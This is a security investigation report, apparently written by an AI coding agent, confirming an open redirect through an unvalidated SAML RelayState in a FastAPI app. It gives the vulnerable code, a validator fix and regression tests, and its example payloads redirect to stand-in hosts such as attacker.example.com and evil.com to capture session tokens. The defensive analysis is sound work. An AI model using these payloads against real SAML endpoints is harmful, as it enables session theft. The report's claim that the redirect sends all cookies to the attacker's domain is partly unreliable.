# GAP-0018 Investigation: Unvalidated `RelayState` open redirect (SAML ACS)

**Date**: 2026-06-05
**Investigator**: Claude Code
**Cross-ref**: SEC-011

---

## Verdict

**Confirmed** — `app/routers/sso_saml.py` line 212 redirects unconditionally to the IdP-supplied `RelayState` value with no origin validation, creating a confirmed open-redirect (CWE-601). SEC-011 independently identifies the same defect at the same line.

---

## Evidence

### Vulnerable code

`app/routers/sso_saml.py:212`:

```python
redirect = RedirectResponse(url=str(relay_state or "/"), status_code=303)
```

`relay_state` is read directly from the POST form body at line 78:

```python
relay_state = form.get("RelayState", "/")
```

No validation occurs between lines 78 and 212. An attacker who controls the SAML response (e.g., via a malicious IdP, a proxied IdP, or a CSRF on an SP-initiated flow) can supply:

```
RelayState=https://attacker.example.com/steal?token=SESSION_COOKIE
```

After a successful SAML authentication the server issues a 303 redirect to `https://attacker.example.com/...` with the session cookies attached to the `Set-Cookie` headers. The browser follows the redirect, sending all cookies to the attacker's domain.

### Dev-bypass path also vulnerable

`app/routers/sso_saml.py:568` (the dev-bypass `_dev_bypass_acs` helper):

```python
redirect = RedirectResponse(url=relay_state or "/", status_code=303)
```

Same pattern, same lack of validation.

### SEC-011 corroboration

`docs/tickets/SEC-011-open-redirect-host-header.md` lines 7–9 explicitly cite `sso_saml.py:78,212` as the open-redirect location with the same `RelayState=https://attacker.com/...` attack vector.

---

## Root Cause

The implementation correctly received `RelayState` (an opaque blob in the SAML spec) and used it as the post-login redirect destination, which is the intended behavior. However it omitted the mandatory safety check: the destination must be a same-origin relative path or an absolute URL whose host matches the platform's configured origin (`S.public_base_url`).

---

## Exact Fix

Add a validator function and call it at both redirect sites:

```python
from urllib.parse import urlparse

def _safe_relay_state(relay_state: str | None) -> str:
    """Return relay_state if it is a safe same-origin path, otherwise '/'."""
    if not relay_state:
        return "/"
    rs = str(relay_state).strip()
    if rs.startswith("//"):
        return "/"                        # protocol-relative URL — reject
    if not rs.startswith("/"):
        # Absolute URL: parse and compare host
        try:
            parsed = urlparse(rs)
            allowed = urlparse(S.public_base_url)
            if parsed.netloc != allowed.netloc:
                return "/"
        except Exception:
            return "/"
    return rs
```

Replace both redirect lines:

```python
# Line 212 (main ACS):
redirect = RedirectResponse(url=_safe_relay_state(relay_state), status_code=303)

# Line 568 (_dev_bypass_acs):
redirect = RedirectResponse(url=_safe_relay_state(relay_state), status_code=303)
```

---

## Blast Radius / Exploit

**Attack scenario** (no prior access required):

1. Attacker crafts a malicious HTML page that auto-submits a SAML POST to `/saml/acs` with a forged `SAMLResponse` and `RelayState=https://evil.com/capture`.
2. If the SAML validation passes (e.g., attacker controls a trusted IdP tenant, or in dev-bypass mode), the server issues a 303 to `evil.com` with `Set-Cookie: ui_session=...` response headers.
3. Because the redirect is cross-origin, the browser sends the navigation to `evil.com`. The cookies are HttpOnly so they aren't directly readable by JS, but the session is established and the victim is now on the attacker's page.
4. More practically: if `relay_state` contains a legitimate platform URL with an attacker-controlled query parameter (e.g., open-redirect chaining), the `ui_access_token` cookie is returned in the initial response and the user is phished.

**Severity**: High (CWE-601). Exploitable by any tenant that can configure an IdP or intercept the SAML binding. In dev mode with `dev_bypass=1`, exploitable trivially without any IdP.

## Regression Test

**pytest** (`tests/test_saml_relay_state.py`):

```python
# Fails before fix:
async def test_open_redirect_rejected(client):
    resp = await client.post("/saml/acs?dev_bypass=1", data={
        "SAMLResponse": "...",
        "RelayState": "https://evil.com/steal",
    }, headers={"x-user-sub": "test@example.com"})
    # Before fix: 303 Location: https://evil.com/steal
    assert "evil.com" not in resp.headers["location"]

# Passes after fix:
    assert resp.headers["location"] == "/"
```

```python
# Same-origin path is preserved:
async def test_relative_relay_state_allowed(client):
    resp = await client.post("/saml/acs?dev_bypass=1", data={
        "SAMLResponse": "...",
        "RelayState": "/dashboard",
    }, headers={"x-user-sub": "test@example.com"})
    assert resp.headers["location"] == "/dashboard"
```

## Dev/Prod Parity

The SAML ACS endpoint exists in both dev and prod (gated by `S.sso_saml_enabled`). `S.public_base_url` is set from the `PUBLIC_BASE_URL` env var in both environments. The fix is purely input validation with no AWS dependency — SECOPS-007 has no additional requirements.

## Effort

**S** (as estimated). The fix is a ~15-line validation function plus two one-line changes. Tests add ~30 lines.
